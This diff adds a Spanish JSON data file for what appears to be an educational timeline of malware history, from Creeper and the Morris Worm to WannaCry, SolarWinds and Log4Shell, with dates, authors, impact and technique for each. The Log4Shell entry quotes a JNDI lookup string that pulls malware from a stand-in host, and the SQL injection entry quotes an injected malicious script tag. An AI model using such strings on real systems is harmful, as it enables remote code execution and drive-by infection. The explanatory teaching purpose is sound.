@@ -1,0 +1,226 @@
+{
+    "exampleDetails": {
+        "Virus Elk Cloner (Apple II)": {
+            "title": "Elk Cloner",
+            "date": "1982",
+            "author": "Rich Skrenta (15 años)",
+            "type": "Virus de Sector de Arranque",
+            "desc": "Considerado el primer virus de computadora 'en libertad' (in the wild) que afectó a computadoras personales. Fue escrito como una broma práctica para infectar sistemas Apple II.",
+            "impact": "Infectaba disquetes de 5.25\". Se alojaba en la memoria y se copiaba a cualquier disco insertado. En el arranque número 50, mostraba un poema burlón: 'It will get on all your disks / It will infiltrate your chips'.",
+            "tech": "No causaba daño físico, pero demostró la viabilidad de código autorreplicante en microcomputadoras. Usaba técnicas de enganche (hooking) en rutinas del DOS."
+        },
+        "Morris Worm (1988)": {
+            "title": "Gusano Morris",
+            "date": "2 Noviembre 1988",
+            "author": "Robert Tappan Morris (Cornell)",
+            "type": "Gusano de Internet",
+            "desc": "El primer malware que llamó la atención de los medios masivos. Diseñado supuestamente para 'medir el tamaño de Internet', pero un error de programación lo hizo altamente agresivo.",
+            "impact": "Colapsó aprox. el 10% de Internet (6,000 máquinas VAX y Sun). Costos estimados de hasta $10M. Llevó a la creación del primer CERT (Computer Emergency Response Team).",
+            "tech": "Explotaba vulnerabilidades en fingerd (buffer overflow), sendmail (debug mode) y rsh/rexec (adivinanza de contraseñas). El bug fatal: no verificaba si una máquina ya estaba infectada, reinfectando indefinidamente."
+        },
+        "Creeper": {
+            "title": "Creeper",
+            "date": "1971",
+            "author": "Bob Thomas (BBN)",
+            "type": "Gusano Experimental",
+            "desc": "El 'Adán' del malware. Un programa experimental en ARPANET diseñado para probar la teoría de autómatas autorreplicantes de John von Neumann.",
+            "impact": "Inocuo. Viajaba entre mainframes PDP-10 corriendo el sistema operativo TENEX. Mostraba el mensaje: 'I'M THE CREEPER: CATCH ME IF YOU CAN'.",
+            "tech": "No se replicaba explosivamente; saltaba de una máquina a otra borrándose de la anterior. Dio origen al primer 'antivirus': Reaper, diseñado para cazar y borrar a Creeper."
+        },
+        "Melissa": {
+            "title": "Melissa",
+            "date": "Marzo 1999",
+            "author": "David L. Smith",
+            "type": "Macro Virus (Word)",
+            "desc": "Un virus de macro que se propagaba por email. Llegaba con el asunto 'Important Message From...' y un doc adjunto 'list.doc' (supuestas claves porno).",
+            "impact": "Colapsó servidores de correo corporativos (Microsoft, Intel) por el volumen de tráfico. Causó $80M en daños. El autor fue condenado a 20 meses de prisión.",
+            "tech": "Escrito en VBA (Visual Basic for Applications). Al abrir el doc, se auto-enviaba a los primeros 50 contactos de Outlook de la víctima."
+        },
+        "ILOVEYOU": {
+            "title": "ILOVEYOU (LoveLetter)",
+            "date": "Mayo 2000",
+            "author": "Onel de Guzman (Filipinas)",
+            "type": "Gusano VBScript",
+            "desc": "Posiblemente el ataque de ingeniería social más exitoso de la historia. Un correo con asunto 'ILOVEYOU' y un adjunto 'LOVE-LETTER-FOR-YOU.TXT.vbs'.",
+            "impact": "Infectó a más de 50 millones de computadoras en 10 días (10% del mundo conectado). Daños estimados en $5-10 mil millones. El Pentágono y la CIA tuvieron que apagar sus correos.",
+            "tech": "Script .vbs que sobrescribía archivos de imagen y audio con copias de sí mismo. Robaba contraseñas leyendo la caché de Windows y las enviaba a un email en Filipinas."
+        },
+        "Code Red": {
+            "title": "Code Red",
+            "date": "Julio 2001",
+            "type": "Gusano File-less",
+            "desc": "Un gusano que atacaba servidores web IIS de Microsoft. Famoso por su frase: 'Hacked By Chinese!'.",
+            "impact": "Infectó 359,000 servidores. Intentó un ataque DDoS coordinado contra la Casa Blanca (whitehouse.gov).",
+            "tech": "Residente solo en memoria (File-less), no escribía en disco, lo que dificultaba su detección forense. Usaba un buffer overflow en el indexador ISAPI de IIS."
+        },
+        "Blaster": {
+            "title": "Blaster (Lovesan)",
+            "date": "Agosto 2003",
+            "type": "Gusano de Red",
+            "desc": "Creado para atacar Windows Update. Contenía un mensaje oculto para Bill Gates: 'billy gates why do you make this possible? Stop making money and fix your software!!'",
+            "impact": "Cientos de miles de PCs infectados reiniciándose automáticamente (el famoso contador de 60 segundos de apagado de RPC).",
+            "tech": "Explotaba una vulnerabilidad DCOM RPC (MS03-026) en Windows XP/2000. Generaba tráfico SYN flood contra windowsupdate.com."
+        },
+        "SQL Injection en masa": {
+            "title": "Ataques SQLi Masivos",
+            "date": "2008-2010s",
+            "type": "Ataque Web Automatizado",
+            "desc": "El uso de herramientas automatizadas (bots) para buscar vulnerabilidades SQL en millones de webs al azar e inyectar código malicioso.",
+            "impact": "Compromiso de millones de sitios legítimos para distribuir malware (Drive-by download) o robar bases de datos de usuarios.",
+            "tech": "Inyección de scripts `<script src=malware.js>` dentro de campos de bases de datos vulnerables. Los visitantes de la web infectada descargaban troyanos silenciosamente."
+        },
+        "Conficker": {
+            "title": "Conficker (Downadup)",
+            "date": "Noviembre 2008",
+            "type": "Gusano Híbrido",
+            "desc": "Una de las botnets más grandes de la historia. Un gusano extremadamente resiliente que usaba múltiples vectores de ataque.",
+            "impact": "Infectó entre 9 y 15 millones de equipos (ejércitos, hospitales, gobiernos). Creó una infraestructura masiva para ciberdelito.",
+            "tech": "Usaba un exploit de Windows (MS08-067), adivinanza de contraseñas de red y propagación vía USB. Usaba criptografía avanzada y DGA (Domain Generation Algorithms) para ocultar su C&C."
+        },
+        "Zeus (Banking Trojan)": {
+            "title": "Zeus (Zbot)",
+            "date": "2007",
+            "type": "Troyano Bancario",
+            "desc": "El rey del malware financiero. Diseñado para robar credenciales bancarias mediante 'Man-in-the-Browser'.",
+            "impact": "Robo de cientos de millones de dólares a nivel mundial. Su código fuente filtrado en 2011 dio origen a miles de variantes modernas.",
+            "tech": "Inyectaba código HTML falso en las webs de bancos legítimos cuando la víctima navegaba. Robaba tokens, keystrokes y cookies."
+        },
+        "Stuxnet (Sabotaje nuclear)": {
+            "title": "Stuxnet",
+            "date": "Descubierto 2010",
+            "type": "Ciberarma Militar",
+            "desc": "El primer arma digital diseñada para causar daño físico cinético. Dirigido específicamente contra las centrífugas nucleares de Irán (Natanz).",
+            "impact": "Destruyó cerca de 1,000 centrífugas nucleares iraníes, retrasando su programa atómico. Marcó el inicio oficial de la Ciberguerra.",
+            "tech": "Usó 4 vulnerabilidades Zero-day de Windows. Buscaba PLCs específicos de Siemens (SCADA). Alteraba la velocidad de rotación de las centrífugas mientras mostraba datos 'normales' a los operadores."
+        },
+        "WannaCry (Ransomware global)": {
+            "title": "WannaCry",
+            "date": "Mayo 2017",
+            "author": "Lazarus Group (N. Corea)",
+            "type": "Ransomworm",
+            "desc": "Un ataque de ransomware global que usó armas cibernéticas robadas a la NSA (EternalBlue).",
+            "impact": "Afectó a 200,000 ordenadores en 150 países en horas. Paralizó el sistema de salud británico (NHS), Renault, Telefónica y FedEx.",
+            "tech": "Combinó ransomware con capacidad de gusano. Usó el exploit EternalBlue (SMBv1) para propagarse sin interacción del usuario. Pedía $300 en Bitcoin."
+        },
+        "NotPetya": {
+            "title": "NotPetya",
+            "date": "Junio 2017",
+            "author": "Sandworm (Rusia)",
+            "type": "Wiper (Destructor)",
+            "desc": "Parecía ransomware, pero era un arma de destrucción pura dirigida contra Ucrania. No había forma de recuperar los archivos.",
+            "impact": "Considerado el ciberataque más costoso de la historia ($10 mil millones). Paralizó a Maersk (transporte mundial), Merck y TNT.",
+            "tech": "Se propagó a través de una actualización maliciosa de software de contabilidad ucraniano (M.E.Doc). Usó EternalBlue y Mimikatz para moverse lateralmente y destruir el MBR (Master Boot Record)."
+        },
+        "SolarWinds (Supply Chain)": {
+            "title": "SolarWinds (Sunburst)",
+            "date": "Descubierto Dic 2020",
+            "type": "Ataque a Cadena de Suministro",
+            "desc": "Los atacantes comprometieron el proceso de compilación de software de SolarWinds, inyectando malware en actualizaciones legítimas de su producto Orion.",
+            "impact": "Comprometió a 18,000 organizaciones, incluyendo el Pentágono, el Departamento de Estado de EE.UU., Microsoft y Cisco.",
+            "tech": "El malware permanecía dormido 14 días antes de activar un backdoor. El tráfico se disfrazaba como protocolos XML legítimos de SolarWinds."
+        },
+        "Log4Shell": {
+            "title": "Log4Shell (Log4j)",
+            "date": "Diciembre 2021",
+            "type": "Vulnerabilidad Zero-day",
+            "desc": "Una vulnerabilidad crítica en la librería de logs de Java más usada del mundo. Permitía ejecución remota de código (RCE) simplemente logueando una cadena de texto.",
+            "impact": "Afectó a casi todo Internet: iCloud, Steam, Minecraft, Twitter. Puntuación CVSS perfecta de 10.0.",
+            "tech": "Explotaba JNDI (Java Naming and Directory Interface). Un atacante enviaba strings como `${jndi:ldap://evil.com/malware}` que el servidor ejecutaba obligatoriamente."
+        },
+        "Deepfakes": {
+            "title": "Deepfakes & IA Ofensiva",
+            "date": "Actualidad",
+            "type": "Desinformación / Fraude",
+            "desc": "Uso de Inteligencia Artificial Generativa (GANs) para crear audio y video falso indistinguible de la realidad.",
+            "impact": "Fraudes a CEOs por voz (vishing con IA), manipulación política y pornografía no consentida. Erosión de la confianza en la evidencia digital.",
+            "tech": "Redes neuronales entrenadas con miles de horas de datos para suplantar rostros y voces en tiempo real."
+        },
+        "Zero-day Brokers": {
+            "title": "Mercado de Zero-days",
+            "date": "Actualidad",
+            "type": "Industria de Espionaje",
+            "desc": "Empresas legítimas (NSO Group, Zerodium) que compran y venden vulnerabilidades desconocidas a gobiernos por millones de dólares.",
+            "impact": "Spyware como Pegasus, capaz de infectar iPhones sin clics (Zero-click) para espiar a periodistas y activistas.",
+            "tech": "Desarrollo de 'Cadenas de exploits' complejas que evaden sandboxing y mitigaciones modernas a nivel de kernel."
+        }
+    },
+    "timeline": [
+        {
+            "gen": "1ª Generación",
+            "eras": "1980s-1990s",
+            "title": "Intrusión física y lógica básica",
+            "desc": "Ataques caracterizados por la replicación de virus en disquetes y copias locales. La motivación principal era el 'ego' técnico y la notoriedad, no el lucro.",
+            "iconName": "Cpu",
+            "color": "text-success",
+            "bg": "bg-success/10",
+            "border": "border-success",
+            "examples": [
+                "Virus Elk Cloner (Apple II)",
+                "Morris Worm (1988)",
+                "Creeper"
+            ]
+        },
+        {
+            "gen": "2ª Generación",
+            "eras": "1990s-2000s",
+            "title": "Conexión a internet y ataques sintácticos",
+            "desc": "Con la explosión de Internet, nacen los gusanos de red y troyanos. Se busca explotar la infraestructura y el lucro económico empieza a aparecer. El software antivirus se convierte en necesidad.",
+            "iconName": "Network",
+            "color": "text-primary",
+            "bg": "bg-primary/10",
+            "border": "border-primary",
+            "examples": [
+                "Melissa",
+                "ILOVEYOU",
+                "Code Red",
+                "Blaster"
+            ]
+        },
+        {
+            "gen": "3ª Generación",
+            "eras": "2000s-2010s",
+            "title": "Ataques a aplicaciones (semánticos)",
+            "desc": "Los atacantes explotan vulnerabilidades en aplicaciones (navegadores, PDF, Flash). Comienza el 'Hacking Industrial' y el robo masivo de datos. Aparecen las Botnets sofisticadas.",
+            "iconName": "Bug",
+            "color": "text-secondary",
+            "bg": "bg-secondary/10",
+            "border": "border-secondary",
+            "examples": [
+                "SQL Injection en masa",
+                "Conficker",
+                "Zeus (Banking Trojan)"
+            ]
+        },
+        {
+            "gen": "4ª Generación",
+            "eras": "2010s-Presente",
+            "title": "Payloads avanzados y ciberguerra",
+            "desc": "Ataques patrocinados por estados. Polimorfismo, ofuscación y amenazas persistentes avanzadas (APT). El objetivo ya no es solo dinero, sino espionaje geopolítico y sabotaje de infraestructuras.",
+            "iconName": "ShieldAlert",
+            "color": "text-error",
+            "bg": "bg-error/10",
+            "border": "border-error",
+            "examples": [
+                "Stuxnet (Sabotaje nuclear)",
+                "WannaCry (Ransomware global)",
+                "NotPetya"
+            ]
+        },
+        {
+            "gen": "5ª Generación",
+            "eras": "Actualidad",
+            "title": "Mega-ataques multi-vector",
+            "desc": "Ataques a gran escala usando IA, vectores móviles y nube. Son 'Multi-todo': multi-vector, multi-plataforma. El malware es capaz de aprender y adaptarse. La defensa requiere IA defensiva.",
+            "iconName": "Brain",
+            "color": "text-warning",
+            "bg": "bg-warning/10",
+            "border": "border-warning",
+            "examples": [
+                "SolarWinds (Supply Chain)",
+                "Log4Shell",
+                "Deepfakes",
+                "Zero-day Brokers"
+            ]
+        }
+    ]
+}
